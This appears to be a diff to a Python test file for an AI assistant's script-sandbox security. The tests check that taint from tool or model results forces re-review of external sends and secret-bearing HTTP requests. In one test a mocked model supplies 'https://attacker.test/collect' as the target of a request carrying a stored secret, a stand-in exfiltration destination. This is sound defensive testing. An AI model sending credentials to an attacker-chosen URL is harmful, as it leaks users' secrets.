@@ -88,6 +88,7 @@ if TYPE_CHECKING:
 
     from sqlalchemy.ext.asyncio import AsyncEngine
 
+    from family_assistant.scripting.apis.keychute import KeychuteScriptHttpClient
     from family_assistant.scripting.invocation import ScriptReviewContext
 
 
@@ -444,14 +445,36 @@ async def test_approved_program_covers_new_taint_and_ordinary_effects_once(
     assert context.taint_tracker.snapshot().max_tier is SourceTrustTier.UNKNOWN_EXTERNAL
 
 
+async def _authorize_keychute(
+    client: KeychuteScriptHttpClient, secret_name: str, url: str
+) -> None:
+    # The broker round trip is faked; the runtime-taint gate in front of it is
+    # what these tests exercise.
+    await client._authorize_egress(
+        secret_name=secret_name,
+        url=url,
+        method="GET",
+        headers=None,
+        request_body=None,
+        reason="",
+        ttl_seconds=300,
+        max_uses=1,
+        approval_timeout_seconds=300,
+        request_timeout_seconds=120.0,
+    )
+
+
 @pytest.mark.asyncio
 async def test_approved_program_covers_keychute_named_sink_once(
     db_engine: AsyncEngine,
 ) -> None:
     request_calls = 0
 
-    async def fake_request(*_args: object, **_kwargs: object) -> dict[str, object]:
+    async def fake_request(
+        client: KeychuteScriptHttpClient, secret_name: str, url: str
+    ) -> dict[str, object]:
         nonlocal request_calls
+        await _authorize_keychute(client, secret_name, url)
         request_calls += 1
         return {"status_code": 200, "headers": {}, "body": b"ok"}
 
@@ -1994,3 +2017,139 @@ async def test_model_result_narrows_approval_for_external_destinations(
         "send_external",
     ]
     assert reviewer.calls[1].review_input.arguments["to"] == "after@example.com"
+
+
+@pytest.mark.asyncio
+async def test_unclassified_tool_result_narrows_approval_for_external_destinations(
+    db_engine: AsyncEngine,
+) -> None:
+    effects: list[str] = []
+
+    async def send_external(to: str) -> str:
+        effects.append(f"sent to {to}")
+        return "sent"
+
+    async def summarise(value: str) -> str:
+        return f"summary of {value}"
+
+    source = (
+        'send_external(to="before@example.com")\n'
+        'summarise(value="inbox")\n'
+        'send_external(to="after@example.com")'
+    )
+    reviewer = _RecordingReviewer(
+        ToolCallReviewVerdict.ALLOW,
+        ToolCallReviewVerdict.ALLOW,
+    )
+    provider = _provider(
+        [
+            _real_registration("execute_script"),
+            _registration(
+                "send_external",
+                cast("ToolImplementation", send_external),
+                tags=(ToolTag.EXTERNAL_COMM, ToolTag.OUTPUT_TRUSTED),
+                properties={"to": {"type": "string"}},
+            ),
+            _registration(
+                "summarise",
+                cast("ToolImplementation", summarise),
+                tags=(ToolTag.READ_ONLY, ToolTag.OUTPUT_TRUSTED),
+                properties={"value": {"type": "string"}},
+                deterministic=False,
+            ),
+        ],
+        reviewer=reviewer,
+        rules=[
+            _review_rule("execute_script", ToolPolicyDecision.REVIEW),
+            _review_rule("send_external", ToolPolicyDecision.REVIEW),
+        ],
+    )
+    context = _context(db_engine, provider)
+
+    await _execute_script(provider, context, script=source)
+
+    assert effects == ["sent to before@example.com", "sent to after@example.com"]
+    assert [call.review_input.descriptor.name for call in reviewer.calls] == [
+        "execute_script",
+        "send_external",
+    ]
+    assert reviewer.calls[1].review_input.arguments["to"] == "after@example.com"
+
+
+@pytest.mark.asyncio
+async def test_model_result_ends_keychute_inheritance(
+    db_engine: AsyncEngine,
+) -> None:
+    request_calls = 0
+
+    async def fake_request(
+        client: KeychuteScriptHttpClient, secret_name: str, url: str
+    ) -> dict[str, object]:
+        nonlocal request_calls
+        await _authorize_keychute(client, secret_name, url)
+        request_calls += 1
+        return {"status_code": 200, "headers": {}, "body": b"ok"}
+
+    source = (
+        'url = llm("Which endpoint?")\n'
+        'keychute_http_request("weather", url)["status_code"]'
+    )
+    reviewer = _RecordingReviewer(
+        ToolCallReviewVerdict.ALLOW,
+        ToolCallReviewVerdict.ALLOW,
+    )
+    provider = _provider(
+        [_real_registration("execute_script")],
+        reviewer=reviewer,
+        rules=[_review_rule("execute_script", ToolPolicyDecision.REVIEW)],
+        taint_policy=TaintPolicyConfig(
+            mode=TaintPolicyMode.ENFORCE,
+            matrix_overrides={
+                SourceTrustTier.UNKNOWN_EXTERNAL: {
+                    SinkClass.SANDBOX_NETWORK: TaintAdjudicateCell(
+                        outcome=TaintPolicyOutcome.ADJUDICATE,
+                        fallback=TaintPolicyOutcome.DENY,
+                    )
+                }
+            },
+        ),
+    )
+    app_config = AppConfig(
+        keychute_config=KeychuteConfig(
+            enabled=True,
+            url="https://keychute.test",
+            token=SecretStr("test-token"),
+        )
+    )
+    context = _context(
+        db_engine,
+        provider,
+        state=_unknown_external_state(),
+        app_config=app_config,
+    )
+    llm_client = RuleBasedMockLLMClient(
+        rules=[],
+        default_response=LLMOutput(content="https://attacker.test/collect"),
+    )
+
+    with (
+        patch(
+            "family_assistant.scripting.apis.keychute.KeychuteScriptHttpClient.request",
+            fake_request,
+        ),
+        patch(
+            "family_assistant.llm.one_shot.LLMClientFactory.create_client",
+            return_value=llm_client,
+        ),
+    ):
+        await _execute_script(provider, context, script=source)
+
+    assert request_calls == 1
+    assert [call.review_input.descriptor.name for call in reviewer.calls] == [
+        "execute_script",
+        "keychute_http_request",
+    ]
+    assert (
+        reviewer.calls[1].review_input.arguments["url"]
+        == "https://attacker.test/collect"
+    )
